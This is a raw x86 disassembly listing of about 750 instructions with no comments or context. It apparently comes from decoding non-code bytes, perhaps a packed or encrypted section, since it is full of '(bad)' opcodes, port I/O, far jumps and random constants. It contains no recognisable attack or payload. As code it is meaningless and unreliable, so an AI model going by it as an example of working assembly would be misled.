  403f32:	push   0x8d8feb42
  403f37:	out    dx,eax
  403f38:	test   ecx,edx
  403f3a:	popa   
  403f3b:	in     al,dx
  403f3c:	lods   al,BYTE PTR ds:[esi]
  403f3d:	les    ebp,FWORD PTR [ecx]
  403f3f:	fadd   DWORD PTR [ebx+0x198719b5]
  403f45:	ret    
  403f46:	pop    edi
  403f47:	dec    edx
  403f48:	cmp    edi,DWORD PTR [ebp-0xc]
  403f4b:	aas    
  403f4c:	icebp  
  403f4d:	pop    es
  403f4e:	xor    ah,BYTE PTR [edi+0x49]
  403f51:	pop    es
  403f52:	rcr    ch,1
  403f54:	mov    esp,0x4fb2137a
  403f59:	mov    al,ds:0x53035fa8
  403f5e:	mov    esp,0x15b35e58
  403f63:	mov    BYTE PTR [esi],dl
  403f65:	cmp    BYTE PTR [eax+0x19],bl
  403f68:	call   DWORD PTR [esi]
  403f6a:	(bad)  
  403f6b:	and    eax,0x81716271
  403f70:	mov    ch,0xdc
  403f72:	loop   0x403fa5
  403f74:	push   esp
  403f75:	add    al,0xff
  403f77:	stc    
  403f78:	sub    edi,DWORD PTR [edi+ebp*1]
  403f7b:	loope  0x403f79
  403f7d:	sub    edx,DWORD PTR [edx-0xc2d3d7f]
  403f83:	fcmovnb st,st(7)
  403f85:	(bad)  
  403f86:	std    
  403f87:	adc    dh,BYTE PTR [esp+ebx*8-0x6e]
  403f8b:	xor    eax,0x533e5839
  403f90:	enter  0x3bdf,0x8d
  403f94:	outs   dx,DWORD PTR ds:[esi]
  403f95:	lock in al,0xbe
  403f98:	sar    dl,0x36
  403f9b:	xlat   BYTE PTR ds:[ebx]
  403f9c:	scas   al,BYTE PTR es:[edi]
  403f9d:	stos   BYTE PTR es:[di],al
  403f9f:	cmp    al,dl
  403fa1:	dec    edi
  403fa2:	jnp    0x40401a
  403fa4:	fisub  WORD PTR [edx+0x5b48bff5]
  403faa:	mov    eax,ds:0x21d58343
  403faf:	int3   
  403fb0:	outs   dx,BYTE PTR ds:[esi]
  403fb1:	fs rol dh,0xf9
  403fb5:	pop    esp
  403fb6:	jmp    0x403f3f
  403fb8:	pusha  
  403fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fba:	ss es xchg edi,eax
  403fbd:	dec    esi
  403fbe:	xchg   esi,eax
  403fbf:	mov    bh,0xe5
  403fc1:	fbstp  TBYTE PTR [edx]
  403fc3:	and    eax,esi
  403fc5:	cli    
  403fc6:	rcl    DWORD PTR [edi],cl
  403fc8:	fistp  QWORD PTR [edi]
  403fca:	pop    ecx
  403fcb:	out    0xab,eax
  403fcd:	and    al,0xac
  403fcf:	push   ecx
  403fd0:	aam    0xbc
  403fd2:	xor    bl,bl
  403fd4:	and    eax,0x7f5240a7
  403fd9:	cmp    esp,ecx
  403fdb:	mov    eax,ds:0x183b6ea9
  403fe0:	jbe    0x404001
  403fe2:	jl     0x403fd0
  403fe4:	je     0x403f82
  403fe6:	test   bl,dh
  403fe8:	aam    0x44
  403fea:	fadd   QWORD PTR [edi-0x6e]
  403fed:	mov    cl,0x49
  403fef:	mov    esi,0xb9a8442d
  403ff4:	in     al,dx
  403ff5:	or     dl,al
  403ff7:	add    eax,0x3797a87b
  403ffc:	xchg   bh,bl
  403ffe:	pop    edx
  403fff:	popa   
  404000:	lahf   
  404001:	add    dh,bl
  404003:	and    eax,0xd93b40dc
  404008:	idiv   DWORD PTR [edx]
  40400a:	mov    ebx,0x399bb106
  40400f:	int    0x10
  404011:	push   ds
  404012:	icebp  
  404013:	mov    ebp,ebx
  404015:	push   edx
  404016:	push   ecx
  404017:	or     BYTE PTR [eax],dl
  404019:	push   0x7
  40401b:	mov    dh,0xc9
  40401d:	jl     0x403fa6
  40401f:	hlt    
  404020:	fs pop esi
  404022:	xlat   BYTE PTR ds:[ebx]
  404023:	adc    eax,0xd9a78f9e
  404028:	add    ecx,DWORD PTR [ecx]
  40402a:	xor    esp,DWORD PTR [edx+edx*8]
  40402d:	nop
  40402e:	lahf   
  40402f:	sbb    eax,0x876d4185
  404034:	cli    
  404035:	cli    
  404036:	sub    eax,ebp
  404038:	cmp    dh,BYTE PTR [eax+0x74]
  40403b:	cmp    al,0xf5
  40403d:	and    DWORD PTR [edx],ebp
  40403f:	shr    BYTE PTR ds:0x74971304,cl
  404045:	and    edx,DWORD PTR [edx]
  404047:	aas    
  404048:	or     BYTE PTR [ebx-0x432d000c],dh
  40404e:	repz in al,dx
  404050:	jp     0x40407c
  404052:	sbb    esi,DWORD PTR [esi+ebx*1]
  404055:	push   ecx
  404056:	cdq    
  404057:	mov    al,0xc4
  404059:	pop    ds
  40405a:	cmc    
  40405b:	adc    al,0x99
  40405d:	pop    ds
  40405e:	bound  esp,QWORD PTR [edi]
  404060:	push   0x28
  404062:	mov    BYTE PTR [eax],cl
  404064:	ds cmp al,BYTE PTR ss:[edx+0x4bc5cbb0]
  40406c:	adc    esp,ecx
  40406e:	movlhps xmm0,xmm5
  404071:	dec    esi
  404072:	jbe    0x404011
  404074:	mov    WORD PTR [esi-0x3b],fs
  404077:	arpl   WORD PTR [ebp-0x39],ax
  40407a:	push   esi
  40407b:	mov    ah,0xe0
  40407d:	and    BYTE PTR ds:0xb4118f09,0x5c
  404084:	arpl   WORD PTR [esi+0x50883485],bx
  40408a:	call   0xcf43:0x87425d7e
  404091:	sub    ebx,DWORD PTR [ebp+0xcf9e104]
  404097:	cwde   
  404098:	pop    eax
  404099:	fisub  DWORD PTR [eax+0x1e]
  40409c:	in     al,0x8a
  40409e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40409f:	out    0x3b,eax
  4040a1:	shr    DWORD PTR [esi+eax*1+0x74af1f1a],cl
  4040a8:	aad    0xb2
  4040aa:	test   BYTE PTR cs:[edx],al
  4040ad:	mov    eax,0x22e91d40
  4040b2:	mov    WORD PTR [edi-0x2bda5b46],?
  4040b8:	data16 das 
  4040ba:	loope  0x404095
  4040bc:	adc    esi,edi
  4040be:	bound  ebp,QWORD PTR [edx+0x9]
  4040c1:	cmp    bl,BYTE PTR [eax+0x65]
  4040c4:	mov    BYTE PTR [edi+ebx*8-0x69],cl
  4040c8:	adc    eax,0xd5ae77bb
  4040cd:	xchg   esi,eax
  4040ce:	push   eax
  4040cf:	lods   al,BYTE PTR ds:[esi]
  4040d0:	lahf   
  4040d1:	jmp    0xf6955248
  4040d6:	lds    ebp,FWORD PTR [esi]
  4040d8:	mov    al,ds:0xab9a11d0
  4040dd:	fucomp st(2)
  4040df:	pop    es
  4040e0:	adc    dh,BYTE PTR [eax-0x76]
  4040e3:	daa    
  4040e4:	in     al,0x6e
  4040e6:	dec    esp
  4040e7:	test   bl,0xe3
  4040ea:	into   
  4040eb:	cmp    DWORD PTR [edx],esi
  4040ed:	push   es
  4040ee:	jne    0x4040b0
  4040f0:	xchg   ebx,eax
  4040f1:	(bad)  
  4040f3:	dec    ebx
  4040f4:	fs je  0x404104
  4040f7:	stos   DWORD PTR es:[edi],eax
  4040f8:	dec    edi
  4040f9:	xchg   ebp,eax
  4040fa:	test   BYTE PTR [ebx-0x187e79fe],dl
  404100:	push   es
  404101:	ret    
  404102:	xchg   ecx,eax
  404103:	and    al,0x5a
  404105:	pop    ebx
  404106:	xchg   al,bl
  404108:	stos   BYTE PTR es:[edi],al
  404109:	and    eax,0xdec43b9b
  40410e:	lea    esi,[ecx]
  404110:	enter  0x58da,0xac
  404114:	stos   BYTE PTR es:[edi],al
  404115:	xor    dl,ah
  404117:	es cmp eax,0xc5379caf
  40411d:	mov    ch,0xe
  40411f:	pop    edi
  404120:	and    al,0xd
  404122:	in     al,dx
  404123:	xchg   ecx,eax
  404124:	adc    ecx,edx
  404126:	es cmp eax,0xa3de7cf2
  40412c:	jns    0x4040d6
  40412e:	push   eax
  40412f:	jmp    0x40415f
  404131:	xor    ecx,DWORD PTR [ebx]
  404133:	mov    al,ds:0x7287ad19
  404138:	cli    
  404139:	jge    0x4041a2
  40413b:	ja     0x4040db
  40413d:	aad    0xbf
  40413f:	pop    ebp
  404140:	sub    ebp,DWORD PTR [ecx-0x7f7b9f63]
  404146:	(bad)  
  404147:	fidiv  DWORD PTR [esi]
  404149:	inc    edi
  40414a:	pushf  
  40414b:	fistp  DWORD PTR [eax-0x50cb2b30]
  404151:	in     al,dx
  404152:	xchg   edi,eax
  404153:	mov    dh,BYTE PTR [eax+0x7c]
  404156:	push   ds
  404157:	addr16 mov ebx,0x155f89b
  40415d:	outs   dx,BYTE PTR ds:[esi]
  40415e:	les    edi,FWORD PTR [ebx]
  404160:	xchg   ebx,eax
  404161:	sti    
  404162:	mov    ds:0x9ae32ca3,al
  404167:	fldenv [bx]
  40416a:	dec    ebp
  40416b:	stc    
  40416c:	iret   
  40416d:	mov    edx,0x951f1492
  404172:	jg     0x404188
  404174:	fcmovbe st,st(1)
  404176:	jmp    0xfccc:0xaa5efb0e
  40417d:	inc    esp
  40417e:	jns    0x40414c
  404180:	lds    eax,FWORD PTR [edi]
  404182:	fs cwde 
  404184:	push   eax
  404185:	sbb    BYTE PTR [ecx],ch
  404187:	jecxz  0x4041cd
  404189:	adc    ecx,ecx
  40418b:	scas   al,BYTE PTR es:[edi]
  40418c:	inc    esp
  40418d:	adc    DWORD PTR [ecx],esp
  40418f:	ds xchg edx,eax
  404191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404192:	mul    DWORD PTR ds:[eax]
  404195:	jnp    0x404150
  404197:	into   
  404198:	push   es
  404199:	adc    edi,edi
  40419b:	push   ebx
  40419c:	std    
  40419d:	cmp    edi,DWORD PTR [edi-0x63]
  4041a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a1:	dec    ebp
  4041a2:	mov    ecx,ebp
  4041a4:	xor    bl,dh
  4041a6:	inc    ebp
  4041a7:	and    bl,BYTE PTR [eax-0x40ceb675]
  4041ad:	sbb    esi,edx
  4041af:	mov    esp,0xc37e2b86
  4041b4:	jecxz  0x40414d
  4041b6:	xchg   ebp,eax
  4041b7:	shr    BYTE PTR [eax+0x4c218e89],cl
  4041bd:	dec    ebp
  4041be:	pop    edi
  4041bf:	(bad)  
  4041c0:	in     eax,0x4c
  4041c2:	in     al,dx
  4041c3:	add    al,0x9f
  4041c5:	test   eax,ebp
  4041c7:	cdq    
  4041c8:	ins    DWORD PTR es:[edi],dx
  4041c9:	xor    dl,al
  4041cb:	mov    dh,0x70
  4041cd:	addr16 std 
  4041cf:	xor    al,0xd6
  4041d1:	pushf  
  4041d2:	mov    es,WORD PTR [ebp-0x6a318ca4]
  4041d8:	les    esi,FWORD PTR [esi-0x45]
  4041db:	jmp    0x968631b0
  4041e0:	inc    edi
  4041e1:	push   edi
  4041e2:	sub    eax,DWORD PTR [ebp-0xe]
  4041e5:	mov    ah,0x10
  4041e7:	pop    ecx
  4041e8:	cdq    
  4041e9:	inc    eax
  4041ea:	mov    ah,0x62
  4041ec:	xchg   ebx,eax
  4041ed:	xchg   esi,eax
  4041ee:	cmp    al,0x68
  4041f0:	fdivr  DWORD PTR [edi-0x57]
  4041f3:	cmp    DWORD PTR ds:0xc298396,ebx
  4041f9:	ja     0x404233
  4041fb:	push   ecx
  4041fc:	mov    ch,0x2
  4041fe:	sub    al,0xa4
  404200:	pop    edx
  404201:	dec    edx
  404202:	scas   eax,DWORD PTR es:[edi]
  404203:	cli    
  404204:	test   bl,dh
  404206:	(bad)  
  404207:	mov    gs,WORD PTR [eax]
  404209:	push   esi
  40420a:	pop    esi
  40420b:	fsubr  DWORD PTR [esp+ecx*4+0x2e]
  40420f:	xchg   DWORD PTR [ebp-0x602c4388],edi
  404215:	pop    ds
  404216:	out    dx,al
  404217:	and    eax,0xb4a06017
  40421c:	cmp    BYTE PTR [ebp+0x219de161],bl
  404222:	int3   
  404223:	xchg   ebx,eax
  404224:	jmp    0xab15:0xf383a3e3
  40422b:	adc    edx,DWORD PTR [edi+0x19d83a10]
  404231:	in     al,0xb
  404233:	(bad)  
  404234:	mul    ebx
  404236:	retf   0x67fb
  404239:	mov    ds:0x10b4ed6b,al
  40423e:	adc    eax,0x85078f15
  404243:	jmp    0x111e:0xc6251914
  40424a:	(bad)  
  40424b:	lods   eax,DWORD PTR ds:[esi]
  40424c:	gs pop eax
  40424e:	rcr    ecx,1
  404250:	xor    ah,bl
  404252:	dec    eax
  404253:	rcl    BYTE PTR [eax],cl
  404255:	(bad)  
  404256:	sub    al,0x2c
  404258:	ret    0xf0b2
  40425b:	sbb    BYTE PTR [ebx],dh
  40425d:	cs push cs
  40425f:	outs   dx,DWORD PTR ds:[esi]
  404260:	(bad)  
  404261:	ficomp DWORD PTR [ebx+eiz*1]
  404264:	jmp    0x4042c5
  404266:	leave  
  404267:	inc    ebx
  404268:	imul   eax,DWORD PTR [ebx-0x25],0x8f81608e
  40426f:	push   es
  404270:	dec    esp
  404271:	call   0x6bd:0xddc75398
  404278:	sub    BYTE PTR [edx-0x4c8cba4c],dh
  40427e:	cs xchg ebp,edx
  404281:	add    al,0xd
  404283:	add    eax,0x326a6c49
  404288:	dec    ebp
  404289:	out    0xa3,eax
  40428b:	push   cs
  40428c:	mov    dl,0xbd
  40428e:	leave  
  40428f:	dec    esi
  404290:	mov    al,ds:0x391ba6f3
  404295:	lahf   
  404296:	inc    esi
  404297:	pop    ds
  404298:	and    al,0xf3
  40429a:	aam    0x7c
  40429c:	push   edx
  40429d:	mov    al,0xcf
  40429f:	adc    al,0x92
  4042a1:	sub    eax,0x4462b240
  4042a6:	add    DWORD PTR [ebp+esi*4+0x30],eax
  4042aa:	mov    eax,fs:0xcad18fa0
  4042b0:	inc    ecx
  4042b1:	mov    al,ds:0xcd752c6f
  4042b6:	mov    ebx,0x5c5e4367
  4042bb:	loope  0x404307
  4042bd:	or     dl,BYTE PTR [edx-0x6e00ade]
  4042c3:	int    0x76
  4042c5:	mov    ah,0x3d
  4042c7:	stos   BYTE PTR es:[edi],al
  4042c8:	pop    ebx
  4042c9:	test   eax,0x1c2a1601
  4042ce:	push   0x3e794b9f
  4042d3:	adc    dl,cl
  4042d5:	int    0x19
  4042d7:	push   esi
  4042d8:	rcr    DWORD PTR ds:0xcf6d43a5,1
  4042de:	jl     0x40432a
  4042e0:	jmp    0x79430a2c
  4042e5:	mov    dh,0xb
  4042e7:	mov    edi,0xc44511f7
  4042ec:	mov    ecx,0xf3c06de6
  4042f1:	iret   
  4042f2:	inc    edx
  4042f3:	loope  0x40429d
  4042f5:	pop    eax
  4042f6:	mov    ch,0x72
  4042f8:	inc    esp
  4042f9:	push   ds
  4042fa:	or     ecx,DWORD PTR [esi-0x6dbc6e69]
  404300:	jo     0x40431c
  404302:	scas   al,BYTE PTR es:[edi]
  404303:	dec    esp
  404304:	inc    esi
  404305:	inc    ebp
  404306:	mov    ebx,0x942c0e77
  40430b:	mov    bl,0x2d
  40430d:	div    DWORD PTR [edi+eiz*1-0x7356fa94]
  404314:	cmp    cl,ch
  404316:	jl     0x404324
  404318:	lds    ebx,FWORD PTR ds:0xff1fb919
  40431e:	rol    edi,cl
  404320:	aad    0x91
  404322:	jno    0x4042b0
  404324:	jg     0x4042e0
  404326:	cli    
  404327:	aam    0x2
  404329:	mov    ah,0xd0
  40432b:	xchg   ecx,eax
  40432c:	xor    DWORD PTR [edi],edx
  40432e:	mov    dl,0xdc
  404330:	ret    
  404331:	loop   0x404328
  404333:	stos   BYTE PTR es:[edi],al
  404334:	mov    ch,0x81
  404336:	xor    al,0xe6
  404338:	cdq    
  404339:	pop    ebp
  40433a:	xchg   esp,eax
  40433b:	sub    al,0xdc
  40433d:	jp     0x404371
  40433f:	pop    ds
  404340:	jae    0x40430c
  404342:	xchg   DWORD PTR [edx+0xc],edx
  404345:	mov    ch,0x88
  404347:	shl    DWORD PTR [edi+ebp*1+0x15af8e0e],1
  40434e:	adc    eax,0x4ef5ecf3
  404353:	in     al,0xd1
  404355:	or     eax,0x26aa5d15
  40435a:	pop    esi
  40435b:	clc    
  40435c:	jae    0x4043cf
  40435e:	icebp  
  40435f:	push   eax
  404360:	inc    ebp
  404361:	inc    ebx
  404362:	mov    bl,0x94
  404364:	pop    esp
  404365:	add    ch,bh
  404367:	neg    DWORD PTR [edx]
  404369:	and    dl,BYTE PTR [eax-0x1]
  40436c:	cmp    BYTE PTR [edx-0xd74000e],al
  404372:	adc    BYTE PTR [ecx],ah
  404374:	stc    
  404375:	cli    
  404376:	fstp   QWORD PTR [esi-0x7a]
  404379:	mov    esi,0xb254518a
  40437e:	popf   
  40437f:	sbb    DWORD PTR [eax+0x2a88fbec],0x7d
  404386:	pop    es
  404387:	cmp    cl,BYTE PTR [ebx]
  404389:	mov    ch,0x92
  40438b:	or     BYTE PTR [ebp-0x126c2d2a],0xa7
  404392:	adc    DWORD PTR [esi-0xd0b43c0],0xebc17aa5
  40439c:	xor    esp,esp
  40439e:	loopne 0x404364
  4043a0:	cmp    eax,0xb5be2e0d
  4043a5:	jb     0x404348
  4043a7:	or     ecx,eax
  4043a9:	icebp  
  4043aa:	sub    eax,0xf10bce87
  4043af:	enter  0x4b9e,0x90
  4043b3:	mov    esp,0x996faec7
  4043b8:	pslld  mm2,mm1
  4043bb:	jno    0x4043fa
  4043bd:	pop    edx
  4043be:	jb     0x4043d4
  4043c0:	xchg   esp,eax
  4043c1:	into   
  4043c2:	adc    al,0xf8
  4043c4:	in     eax,dx
  4043c5:	pop    es
  4043c6:	dec    ebx
  4043c7:	sbb    ebp,esp
  4043c9:	cli    
  4043ca:	sub    al,0x16
  4043cc:	fwait
  4043cd:	mov    bl,0xae
  4043cf:	pop    ecx
  4043d0:	or     DWORD PTR [bp+di],esi
  4043d3:	(bad)  
  4043d4:	and    al,BYTE PTR ds:0x6b1f2f78
  4043da:	sbb    al,0x70
  4043dc:	shr    esi,1
  4043de:	cmp    DWORD PTR [esi-0x71b5fbc9],ebx
  4043e4:	retf   
  4043e5:	inc    DWORD PTR [eax-0x7a]
  4043e8:	out    dx,al
  4043e9:	adc    esi,esi
  4043eb:	mov    bl,0xa7
  4043ed:	jbe    0x404372
  4043ef:	push   esp
  4043f0:	adc    al,0x1b
  4043f2:	dec    esp
  4043f3:	or     eax,0xb537b7a5
  4043f8:	or     DWORD PTR [eax],esi
  4043fa:	das    
  4043fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043fc:	test   eax,0xbcc49fc5
  404401:	int    0xab
  404403:	int3   
  404404:	or     al,0x5f
  404406:	push   edx
  404407:	xchg   esi,eax
  404408:	mov    DWORD PTR [ecx-0x1b],ebx
  40440b:	dec    edi
  40440c:	aad    0xc0
  40440e:	push   eax
  40440f:	cmp    ah,BYTE PTR [esp-0x65]
  404413:	outs   dx,DWORD PTR ds:[esi]
  404414:	(bad)  
  404416:	inc    esp
  404417:	aaa    
  404418:	fwait
  404419:	mov    al,BYTE PTR [ecx-0x28]
  40441c:	mov    cl,BYTE PTR [edx+0x67720f75]
  404422:	adc    edx,0x7d
  404425:	pop    eax
  404426:	out    dx,eax
  404427:	stos   DWORD PTR es:[edi],eax
  404428:	iret   
  404429:	rcl    DWORD PTR [ecx-0x172ab2ab],1
  40442f:	test   eax,0xec0c3635
  404434:	or     DWORD PTR [edi],edi
  404436:	aad    0x85
  404438:	test   eax,0x76170c6d
  40443d:	jmp    0x8bda9a05
  404442:	mov    dh,0x46
  404444:	pop    ebx
  404445:	aad    0x3f
  404447:	ret    0xbf0f
  40444a:	in     eax,0xd8
  40444c:	imul   eax,DWORD PTR [ecx+0x6a7503fc],0x68065d56
  404456:	or     DWORD PTR [ebp-0x7],ebx
  404459:	push   edx
  40445a:	xor    ebp,ebp
  40445c:	outs   dx,DWORD PTR ds:[esi]
  40445d:	cld    
  40445e:	xchg   esp,eax
  40445f:	ins    BYTE PTR es:[edi],dx
  404460:	(bad)  
  404461:	mov    eax,0xe4c50a38
  404466:	dec    edi
  404467:	sub    ah,BYTE PTR [ecx+0x387be8fb]
  40446d:	dec    ebp
  40446e:	jbe    0x404427
  404470:	lahf   
  404471:	(bad)  
  404473:	test   al,0x30
  404475:	enter  0x9bbf,0x16
  404479:	mov    al,0x81
  40447b:	popf   
  40447c:	pop    ebp
  40447d:	scas   eax,DWORD PTR es:[edi]
  40447e:	sub    BYTE PTR [ecx-0x6d],al
  404481:	xor    ecx,ecx
  404483:	cli    
  404484:	jo     0x404495
  404486:	mov    ds:0x8689c5a8,eax
  40448b:	(bad)  
  40448c:	mov    esi,fs
  40448e:	jle    0x4044b2
  404490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404491:	cli    
  404492:	add    eax,0x8393499e
  404497:	icebp  
  404498:	push   0x20d24bfe
  40449d:	xchg   ecx,eax
  40449e:	fidivr DWORD PTR [ebp-0x63]
  4044a1:	call   0xcd95:0x1865ebb2
  4044a8:	xchg   BYTE PTR [edx],cl
  4044aa:	jecxz  0x404453
  4044ac:	cld    
  4044ad:	mov    ecx,0x39055d98
  4044b2:	jae    0x40449e
  4044b4:	add    DWORD PTR [ebp+0x49],ebx
  4044b7:	pop    ebp
  4044b8:	scas   eax,DWORD PTR es:[edi]
  4044b9:	fs dec esp
  4044bb:	pushf  
  4044bc:	sub    BYTE PTR [ecx],al
  4044be:	ss leave 
  4044c0:	sub    eax,0x1201e5b5
  4044c5:	mov    gs,WORD PTR [edx]
  4044c7:	push   cs
  4044c8:	mov    ch,0x4d
  4044ca:	je     0x4044f3
  4044cc:	xchg   esp,eax
  4044cd:	ficom  WORD PTR [eax+0x4b]
  4044d0:	sbb    ebx,DWORD PTR [esi]
  4044d2:	mov    ds,ebp
  4044d4:	mov    bh,0xf5
  4044d6:	sub    BYTE PTR [ebx+0x14c922d9],0x27
  4044dd:	sar    BYTE PTR [ebp+0x2d975545],1
  4044e3:	out    dx,eax
  4044e4:	adc    BYTE PTR [ebx-0x6a],bl
  4044e7:	jne    0x40451e
  4044e9:	cmp    ebp,DWORD PTR [ebp-0x7c59ca4a]
  4044ef:	mov    ?,WORD PTR [esi-0x57]
  4044f2:	mov    WORD PTR [eax+0x61e02f7c],?
  4044f8:	in     eax,0xd0
  4044fa:	push   0xd5fa799e
  4044ff:	test   BYTE PTR [edi+0x4c],bh
  404502:	mov    cl,BYTE PTR [edi]
  404504:	sbb    BYTE PTR [edi+0x61],dh
  404507:	mov    ch,0x4c
  404509:	lea    edi,[ecx+0x3e9504cf]
  40450f:	js     0x40454c
  404511:	or     al,0x14
  404513:	cmp    al,0x91
  404515:	test   BYTE PTR [edi],bh
  404517:	sti    
  404518:	out    dx,eax
  404519:	and    eax,0xd2ddf465
  40451e:	arpl   WORD PTR [edi+0x51],sp
  404521:	call   0xb88c3a6a
  404526:	popf   
  404527:	pop    ss
  404528:	push   cs
  404529:	mov    ebp,0x728b9547
  40452e:	xchg   ecx,ebx
  404530:	or     BYTE PTR [edx],cl
  404532:	cmp    al,0x28
  404534:	inc    eax
  404535:	sahf   
  404536:	xchg   ecx,eax
  404538:	sub    al,0x99
  40453a:	sti    
  40453b:	aam    0xfd
  40453d:	lea    ecx,[esi-0x2fde806f]
  404543:	ins    DWORD PTR es:[edi],dx
  404544:	pop    es
  404545:	les    esi,FWORD PTR [ecx+0x2f]
  404548:	inc    eax
  404549:	pinsrw mm3,WORD PTR [ebx+0x14],0x25
  40454e:	and    BYTE PTR [ebp-0x76f2a000],ah
  404554:	sbb    eax,DWORD PTR [esi+0x30f7e95]
  40455a:	pop    esi
  40455b:	out    dx,al
  40455c:	les    ebp,FWORD PTR [ebp-0x6f2fae23]
  404562:	sub    al,0x2
  404564:	std    
  404565:	ins    DWORD PTR es:[edi],dx
  404566:	iret   
  404567:	mov    cl,0x6f
  404569:	loop   0x4045d1
  40456b:	sti    
  40456c:	sub    BYTE PTR [ebp-0x79],bl
  40456f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404570:	pop    esp
  404571:	(bad)  
  404572:	sub    BYTE PTR [edi+ebp*2-0x69],dh
  404576:	jg     0x40452b
  404578:	mov    DWORD PTR [edx],eax
  40457a:	(bad)  
  40457b:	mov    ah,0x1d
  40457d:	popa   
  40457e:	add    BYTE PTR [edi+eax*4+0x4fe72e62],0xaa
  404586:	xchg   ecx,eax
  404587:	adc    eax,0xfced6973
  40458c:	dec    esp
  40458d:	in     al,0x14
  40458f:	cmp    al,0x87
  404591:	in     al,dx
  404592:	cmp    al,0x56
  404594:	(bad)  
  404595:	cld    
  404596:	jno    0x40453e
  404598:	mov    eax,ds:0x5fee8ac6
  40459d:	dec    ebx
  40459e:	daa    
  40459f:	repz sbb al,0xd0
  4045a2:	daa    
  4045a3:	test   eax,0x311fce43
  4045a8:	push   ebx
  4045a9:	cld    
  4045aa:	jne    0x404624
  4045ac:	mov    eax,0x8f174f97
  4045b1:	arpl   WORD PTR [esi-0x5a],sp
  4045b4:	mov    ebx,DWORD PTR [esi]
  4045b6:	pop    ss
  4045b7:	push   ebx
  4045b8:	repnz mov ch,0xd7
  4045bb:	lds    ecx,FWORD PTR ds:0x1651b5b7
  4045c1:	sti    
  4045c2:	data16 jecxz 0x4045c6
  4045c5:	cs and eax,0x62e4feee
  4045cb:	jne    0x4045e5
  4045cd:	pop    ebx
  4045ce:	mov    eax,0x6011f036
  4045d3:	ficomp WORD PTR [esp+eax*8]
  4045d6:	outs   dx,DWORD PTR ds:[esi]
  4045d7:	mov    bl,0x7e
  4045d9:	(bad)  
  4045da:	fst    DWORD PTR [esi+0x60]
  4045dd:	adc    cl,BYTE PTR [ebp-0x4b]
  4045e0:	sub    DWORD PTR [ecx],esi
  4045e2:	jg     0x40463b
  4045e4:	jmp    FWORD PTR [ebx+0x2c041d18]
  4045ea:	dec    ebx
  4045eb:	repnz aad 0x74
  4045ee:	sub    al,0x52
  4045f0:	jb     0x40459c
  4045f2:	xchg   edx,eax
  4045f3:	imul   DWORD PTR ds:0xd84b179b
  4045f9:	outs   dx,DWORD PTR ds:[esi]
  4045fa:	mov    bh,0x21
  4045fc:	cli    
  4045fd:	pop    ebp
  4045fe:	jle    0x404634
  404600:	push   ecx
  404601:	jo     0x4045c2
  404603:	cs iret 
  404605:	jp     0x40465b
  404607:	out    dx,al
  404608:	jbe    0x40460d
  40460a:	mov    al,0x68
  40460c:	jno    0x40465b
  40460e:	inc    ecx
  40460f:	mov    edi,0x5e983a3b
  404614:	add    cl,BYTE PTR [edi]
  404616:	push   ebx
  404617:	lahf   
  404618:	inc    esp
  404619:	mov    bh,0x29
  40461b:	(bad)  
  40461c:	dec    ebp
  40461d:	rol    BYTE PTR [edx+0x61f8ef63],1
  404623:	mov    ds:0x35a57b4e,al
  404628:	pop    esp
  404629:	sub    cl,BYTE PTR [ebx]
  40462b:	fisttp QWORD PTR [esp+ebp*4+0xe0267fd]
  404632:	xchg   ebp,eax
  404633:	jnp    0x404603
  404635:	icebp  
  404636:	test   DWORD PTR ds:0xae8c63ee,eax
  40463c:	xlat   BYTE PTR ds:[ebx]
  40463d:	sar    BYTE PTR [eax+edx*2+0x54],0xdf
  404642:	retf   0x9260
  404645:	pop    esp
  404646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404647:	mov    ds:0xaf0234ad,al
  40464c:	lea    esp,[eax+0x41a5cf59]
  404652:	push   edi
  404653:	push   ds
  404654:	arpl   sp,di
  404656:	pop    edx
  404657:	in     eax,dx
  404658:	call   0x7698:0x45b56b57
  40465f:	or     eax,0x475d1afc
  404664:	arpl   WORD PTR [edi],di
  404666:	pop    ds
  404667:	inc    ecx
  404668:	adc    eax,0xf72ad5f8
  40466d:	mov    al,ds:0x65da299b
  404672:	call   0xcc59:0x22888cef
  404679:	dec    ecx
  40467a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40467b:	repz dec esi
  40467d:	push   eax
  40467e:	shl    ecx,1
  404680:	rol    DWORD PTR [esi+0x45034b63],0x21
  404687:	xchg   esi,eax
  404688:	lock lea edx,[edx-0x7a]
  40468c:	mov    ecx,0x4c7cf614
  404691:	imul   esi,DWORD PTR [edi-0x496d11d4],0x36
  404698:	xor    BYTE PTR [edi+0x467a9f2a],dh
  40469e:	mov    ds:0x81bc6019,al
  4046a3:	fimul  WORD PTR [ebx]
  4046a5:	add    BYTE PTR [esi+0x56],0x7a
  4046a9:	mov    eax,ds:0xa64951bb
  4046ae:	jecxz  0x404694
  4046b0:	jg     0x4046cb
  4046b2:	add    al,0x65
  4046b4:	mov    WORD PTR ds:0xd37bdbfa,es
  4046ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046bb:	push   esp
  4046bc:	xor    edx,esi
  4046be:	test   DWORD PTR [ecx-0xa6d353c],0xf1d125f7
  4046c8:	mov    ecx,0x387e7816
  4046cd:	int3   
  4046ce:	mov    edx,0xe46c7377
  4046d3:	xchg   edi,eax
  4046d4:	jle    0x4046ea
  4046d6:	outs   dx,DWORD PTR ds:[esi]
  4046d7:	test   al,0x3b
  4046d9:	xchg   edi,eax
  4046da:	adc    DWORD PTR [ebp-0x58692ecb],0x3971fdba
  4046e4:	sar    bh,0xd1
  4046e7:	mov    ebp,0x5d3b2851
  4046ec:	inc    ecx
  4046ed:	mov    esp,0x10760830
  4046f2:	hlt    
  4046f3:	mov    eax,0x1553b3ec
  4046f8:	stc    
  4046f9:	bound  edx,QWORD PTR [ebx]
  4046fb:	nop
  4046fc:	mov    eax,ds
  4046fe:	inc    esp
  4046ff:	lds    esp,FWORD PTR [eax+0x70ae6ed6]
  404705:	push   0xf49d4bff
  40470a:	pop    ds
  40470b:	cmp    ah,dl
  40470d:	and    DWORD PTR [esi],edi
  40470f:	ins    BYTE PTR es:[edi],dx
  404710:	loopne 0x4046c6
